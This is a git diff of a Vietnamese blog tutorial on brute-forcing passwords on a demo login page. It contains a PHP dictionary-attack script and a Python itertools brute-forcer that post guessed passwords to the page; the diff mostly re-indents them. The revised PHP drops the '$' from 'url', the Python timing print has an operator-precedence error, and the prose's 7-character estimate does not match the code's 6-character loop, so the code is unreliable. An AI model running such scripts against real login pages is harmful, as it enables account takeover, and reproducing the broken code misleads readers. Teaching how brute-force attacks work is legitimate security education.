@@ -7,30 +7,29 @@ categories: CSATT attack
 Hôm trước thầy Tuấn Anh đã nhắc đến phương pháp này, tuy nhiên tôi sẽ làm rõ thêm một số vấn đề, đây không phải là một bài giải cặn kẽ cho các bạn, nó mang tính định hướng nhiều hơn.
 
 # Code sample
-Giả sử tôi có trang đăng nhập là http://tqk.itps.com.vn/demo.php. tôi sẽ tiến hành brute mật khẩu của user: test@demo.brute
+Giả sử tôi có trang đăng nhập là [http://tqk.itps.com.vn/demo.php](http://tqk.itps.com.vn/demo.php). tôi sẽ tiến hành brute mật khẩu của user: test@demo.brute
 
 PHP:
-{% highlight php startinline=true %}
+{% highlight php linenos startinline=true %}
 <?php
 $dic = ['demo', '123', '1234', '123456', 'test', 'demo1', 'demo123', '123demo'];
 foreach ($dic as $password) {
-  $email = 'test@demo.brute';
-  $url = 'http://tqk.itps.com.vn/demo.php';
-  $data_string = 'email=' .urldecode($email). '&password=' .urlencode($password);
-  $ch = curl_init();
-  curl_setopt($ch, CURLOPT_URL, $url);
-  curl_setopt($ch, CURLOPT_POST, 1);
-  curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-  $result = curl_exec($ch);
-  curl_close($ch);
-  if (strpos($result, 'talent') == false){
-    echo "<pre> Password: " .$password. " => Wrong password!</pre>";
-  } else{
-    echo "<pre> Password: " .$password. " => You got it.</pre>";
-  }
-  
-  }
+    $email = 'test@demo.brute';
+    url = 'http://tqk.itps.com.vn/demo.php';
+    $data_string = 'email=' .urldecode($email). '&password=' .urlencode($password);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    if (strpos($result, 'talent') == false){
+        echo "<pre> Password: " .$password. " => Wrong password!</pre>";
+    } else {
+        echo "<pre> Password: " .$password. " => You got it.</pre>";
+    }
+}
 ?>
 {% endhighlight %}
 
@@ -80,15 +79,15 @@ url = 'http://tqk.itps.com.vn/demo.php'
 res = itertools.product(charset, repeat=6)
 start_time = time.time()
 for i in res:
-    password = ''.join(i)
-    payload = {'email':'test@demo.brute', 'password':password}
-    req = requests.post(url, data=payload)
-    print('Trying password: ', password)
-    if('talent' in req.text):
-        print('Password found:', password)
-        print('\nTaken %s seconds to crack very easy password' %time.time() - start_time)
-    else:
-        print('Failed.....')
+  password = ''.join(i)
+  payload = {'email':'test@demo.brute', 'password':password}
+  req = requests.post(url, data=payload)
+  print('Trying password: ', password)
+  if('talent' in req.text):
+    print('Password found:', password)
+    print('\nTaken %s seconds to crack very easy password' %time.time() - start_time)
+  else:
+    print('Failed.....')
 {% endhighlight %}
 
 Và khi tôi chạy đoạn code này, với một máy tính "bình dân" của tôi, ước tính phải mất đến hơn 3 năm để có thể duyệt hết được số lượng hơn 2 tỉ mật khẩu đơn giản có độ dài 7 kí tự chỉ bao gồm chữ cái thường và chữ số. ( Ở đây tôi không đề cập đến việc perfomance, multithreading, đường truyền, sử dụng GPU và một số vấn đề khác). Một con số đáng kể.
